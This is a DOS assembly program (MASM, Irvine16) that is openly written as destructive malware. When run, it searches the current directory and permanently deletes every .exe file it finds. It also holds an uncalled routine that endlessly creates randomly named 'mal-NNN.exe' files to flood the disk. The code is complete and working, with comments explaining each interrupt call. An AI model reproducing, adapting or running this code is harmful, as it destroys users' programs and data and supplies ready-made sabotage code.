;This code deletes all exe files for now
INCLUDE Irvine16.inc

.data
	;Delete part
	DTA BYTE 128 DUP(0)		;Disk Transfer Address
	delete_files BYTE "*.exe",0		;* is wildcard for any number of characters, used by 4Eh(find first file) and 4Fh(find next file)
	;Random creator part
	random_file BYTE "mal-",3 DUP(?), ".exe",0
	
.code

	main PROC
		
		mov ax, @data
		mov ds, ax
	
		call search_exe_files_and_delete
	
		exit
	main ENDP
	;---------------------------------------------------------------------------------------------------
	search_exe_files_and_delete PROC
	;Requires generic pattern for exe files to be declared in files variable
	;Uses dx, ah, cx registers and delete_file function
	;Sets manual DTA defined in .data
	;Searches all of the exe files in the current directory and deletes them
		mov dx, OFFSET DTA
		mov ah, 1Ah     	;Setting Disk Transfer Address to 128 bytes
		int 21h				;DTA is used for 4Eh and 4Fh
	
		mov ah, 4Eh			;Find first file in this case *.exe file, * is wildcard 
		mov cx, 00h			;Attribute is 00h	
		mov dx, OFFSET delete_files 
		int 21h
		JC quit				;If carry is set either File is not found or No more files
		
		mov dx, OFFSET DTA+30	;File name is present at offset 30 of DTA,attribute,time stamps etc are present before offset 30
		call delete_file
		
		search_files:
			mov ah, 4Fh		;Find next file,DTA must point at a data record set up by Find first file interrupt
			mov cx, 00h		;Attribute is 00h read-only
			int 21h
			JC quit			;If carry is set then there aren't any more files ax will have 18	
			
			mov dx, OFFSET DTA+30	;Next file name is at 30 offset of DTA
			call delete_file		;.exe file is already present in dx
			JMP search_files		;Keep searching files
		
		quit:
		ret
	search_exe_files_and_delete ENDP
	;------------------------------------------------------
	delete_file PROC
	;Requires dx to have a filename
	;Uses ah register for interrupt
	;The file is peramnently deleted from computer
		mov ah, 41h
		int 21h			;No need to check Carry Flag for error here
		
		ret
	delete_file ENDP
	;----------------------------------------------------------------------------------------------------
	;Functions for random part
	;----------------------------------------------------------------------------------------------------
	generate_random_exe_files PROC
	;Requires random_file to be created
	;Uses ecx,si,eax,al,dx,bx registers and create_file and close_file functions
	;Generates mal-...exe files infinitely or upto n times
	
		call randomize			;Re-seeds random number generator with current time in hundredths of seconds
		
		;mov ecx, 0
		create_random_exe_file:
			mov si, 4			;Because we need to insert after - in 'mal-' which is 4 index 
			randomize_and_move:
				mov eax, 10
				call RandomRange
				
				or al, 00110000b		;Because moving a number in a string will make it be read as ascii so converting to ascii here
				mov random_file[si], al
				
				inc si
				cmp si, (LENGTHOF random_file) - 5		;-5 is being done here because last five characters are '.exe,0'
				JB randomize_and_move
		
			;mov dx, OFFS-ET random_file
			;call Writestring
			
			mov dx, OFFSET random_file
			call create_file		;Requires dx to have file name
			
			mov bx, ax			;'create_file' moves file handle in ax
			call close_file		;Requires bx to have file handle
			
			JMP create_random_exe_file
	
		ret
	generate_random_exe_files ENDP
	;--------------------------------------------------------------------------------------------------
	create_file PROC
	;Requires dx to have file name
	;Uses ah, cx registers
	;Creates a file
		mov ah, 3Ch			;Interrupt for creating a file
		mov cx, 00h			;Attribute
		int 21h				;If successful then file handle in ax,otherwise Carry Flag is set
							;No need for JC condition here 
		ret
	create_file ENDP
	;--------------------------------------------------------------------------------------------------
	close_file PROC
	;Requires bx to have file handle
	;Uses ah register
	;Closes the file
		mov ah, 3Eh			;Interrupt for closing a file
		int 21h				;No need for JC condition here

		ret
	close_file ENDP
END main